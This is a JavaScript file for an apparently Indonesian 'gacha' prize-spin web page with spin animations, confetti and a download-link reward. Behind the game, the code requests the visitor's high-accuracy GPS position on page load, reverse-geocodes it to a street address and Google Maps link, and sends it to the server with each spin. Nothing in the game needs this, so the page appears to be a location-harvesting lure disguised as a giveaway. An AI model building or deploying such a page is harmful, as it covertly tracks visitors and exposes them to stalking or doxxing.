class GachaSystem {
    constructor() {
        this.spinButton = document.getElementById('spinButton');
        this.resultModal = document.getElementById('resultModal');
        this.loadingOverlay = document.getElementById('loadingOverlay');
        this.closeButton = document.querySelector('.close');
        this.closeBtn = document.getElementById('closeBtn');
        this.downloadBtn = document.getElementById('downloadBtn');
        this.items = document.querySelectorAll('.item-box');
        
        this.locationData = {};
        this.init();
    }
    
    init() {
        this.spinButton.addEventListener('click', () => this.handleSpin());
        this.closeButton.addEventListener('click', () => this.closeModal());
        this.closeBtn.addEventListener('click', () => this.closeModal());
        
        // Close modal when clicking outside
        window.addEventListener('click', (e) => {
            if (e.target === this.resultModal) {
                this.closeModal();
            }
        });
        
        // Add hover effects to items
        this.items.forEach(item => {
            item.addEventListener('mouseenter', () => {
                item.classList.add('glow');
            });
            
            item.addEventListener('mouseleave', () => {
                item.classList.remove('glow');
            });
        });
        
        // Get location data if available from session
        this.getLocationData();
    }
    
    async getLocationData() {
        try {
            if (navigator.geolocation) {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    });
                });
                
                this.locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                };
                
                // Try to get address
                try {
                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${this.locationData.latitude}&lon=${this.locationData.longitude}`);
                    const data = await response.json();
                    
                    if (data.address) {
                        this.locationData.address = {
                            road: data.address.road || '',
                            suburb: data.address.suburb || '',
                            city: data.address.city || data.address.town || data.address.village || '',
                            state: data.address.state || '',
                            country: data.address.country || '',
                            postcode: data.address.postcode || ''
                        };
                        
                        this.locationData.google_maps = `https://www.google.com/maps?q=${this.locationData.latitude},${this.locationData.longitude}`;
                    }
                } catch (error) {
                    console.log('Tidak bisa mendapatkan alamat:', error);
                }
            }
        } catch (error) {
            console.log('Tidak bisa mendapatkan lokasi:', error);
        }
    }
    
    async handleSpin() {
        // Show loading animation
        this.showLoading();
        
        // Disable spin button
        this.spinButton.disabled = true;
        this.spinButton.style.opacity = '0.7';
        
        try {
            const response = await fetch('/spin', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                credentials: 'same-origin',
                body: JSON.stringify({
                    location_data: this.locationData
                })
            });
            
            const data = await response.json();
            
            if (data.success) {
                // Simulate spinning animation
                await this.playSpinAnimation();
                
                // Show result after animation
                setTimeout(() => {
                    this.hideLoading();
                    this.showResult(data.item);
                }, 1000);
                
            } else {
                this.hideLoading();
                alert('Error: ' + data.error);
                this.spinButton.disabled = false;
                this.spinButton.style.opacity = '1';
            }
            
        } catch (error) {
            console.error('Error:', error);
            this.hideLoading();
            alert('Terjadi kesalahan sistem');
            this.spinButton.disabled = false;
            this.spinButton.style.opacity = '1';
        }
    }
    
    async playSpinAnimation() {
        return new Promise((resolve) => {
            // Highlight animation for all items
            this.items.forEach(item => {
                item.style.transition = 'all 0.1s ease';
            });
            
            // Spin through items multiple times
            const spinDuration = 3000; // 3 seconds
            const startTime = Date.now();
            let currentIndex = 0;
            
            const spinInterval = setInterval(() => {
                const elapsed = Date.now() - startTime;
                const progress = elapsed / spinDuration;
                
                // Remove highlight from all items
                this.items.forEach(item => {
                    item.style.transform = 'scale(1)';
                    item.style.boxShadow = 'none';
                });
                
                // Highlight current item
                this.items[currentIndex].style.transform = 'scale(1.1)';
                this.items[currentIndex].style.boxShadow = '0 0 20px rgba(255, 215, 0, 0.8)';
                
                // Move to next item
                currentIndex = (currentIndex + 1) % this.items.length;
                
                // Slow down towards the end
                if (progress > 0.8) {
                    clearInterval(spinInterval);
                    this.slowDownAnimation(currentIndex).then(resolve);
                }
                
            }, 100);
        });
    }
    
    async slowDownAnimation(startIndex) {
        return new Promise((resolve) => {
            let currentIndex = startIndex;
            let delay = 200; // Start with 200ms delay
            
            const slowDownInterval = setInterval(() => {
                // Remove highlight from all items
                this.items.forEach(item => {
                    item.style.transform = 'scale(1)';
                    item.style.boxShadow = 'none';
                });
                
                // Highlight current item
                this.items[currentIndex].style.transform = 'scale(1.1)';
                this.items[currentIndex].style.boxShadow = '0 0 20px rgba(255, 215, 0, 0.8)';
                
                // Move to next item
                currentIndex = (currentIndex + 1) % this.items.length;
                
                // Increase delay to slow down
                delay += 50;
                
                // Stop when delay is too long
                if (delay > 500) {
                    clearInterval(slowDownInterval);
                    
                    // Final highlight on the first item (will be replaced by actual result)
                    setTimeout(() => {
                        this.items.forEach(item => {
                            item.style.transform = 'scale(1)';
                            item.style.boxShadow = 'none';
                        });
                        resolve();
                    }, 300);
                }
                
            }, delay);
        });
    }
    
    showResult(item) {
        // Update modal content
        document.getElementById('resultImg').src = `/static/images/${item.image}`;
        document.getElementById('resultImg').alt = item.name;
        document.getElementById('resultName').textContent = item.name;
        
        // Set rarity badge
        const rarityBadge = document.getElementById('resultRarity');
        rarityBadge.textContent = item.rarity;
        rarityBadge.className = `rarity-badge ${item.rarity.toLowerCase()}`;
        
        // Set download link
        this.downloadBtn.href = item.download_link;
        
        // Show modal
        this.resultModal.style.display = 'block';
        
        // Play confetti animation
        this.createConfetti();
        
        // Re-enable spin button
        this.spinButton.disabled = false;
        this.spinButton.style.opacity = '1';
    }
    
    closeModal() {
        this.resultModal.style.display = 'none';
    }
    
    showLoading() {
        this.loadingOverlay.style.display = 'flex';
    }
    
    hideLoading() {
        this.loadingOverlay.style.display = 'none';
    }
    
    createConfetti() {
        const confettiCount = 200;
        const confettiContainer = document.createElement('div');
        confettiContainer.style.position = 'fixed';
        confettiContainer.style.top = '0';
        confettiContainer.style.left = '0';
        confettiContainer.style.width = '100%';
        confettiContainer.style.height = '100%';
        confettiContainer.style.pointerEvents = 'none';
        confettiContainer.style.zIndex = '1001';
        
        document.body.appendChild(confettiContainer);
        
        for (let i = 0; i < confettiCount; i++) {
            const confetti = document.createElement('div');
            confetti.style.position = 'absolute';
            confetti.style.width = '10px';
            confetti.style.height = '10px';
            confetti.style.backgroundColor = this.getRandomColor();
            confetti.style.borderRadius = '50%';
            confetti.style.left = Math.random() * 100 + 'vw';
            confetti.style.animation = `confettiFall ${Math.random() * 3 + 2}s linear forwards`;
            
            confettiContainer.appendChild(confetti);
            
            setTimeout(() => {
                confetti.remove();
            }, 5000);
        }
        
        setTimeout(() => {
            confettiContainer.remove();
        }, 5000);
    }
    
    getRandomColor() {
        const colors = ['#ff6b6b', '#4ecdc4', '#45aaf2', '#ffd700', '#c0c0c0', '#cd7f32'];
        return colors[Math.floor(Math.random() * colors.length)];
    }
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', () => {
    new GachaSystem();
    
    // Add confetti animation style
    const style = document.createElement('style');
    style.textContent = `
        @keyframes confettiFall {
            0% {
                transform: translateY(-100px) rotate(0deg);
                opacity: 1;
            }
            100% {
                transform: translateY(100vh) rotate(720deg);
                opacity: 0;
            }
        }
    `;
    document.head.appendChild(style);
});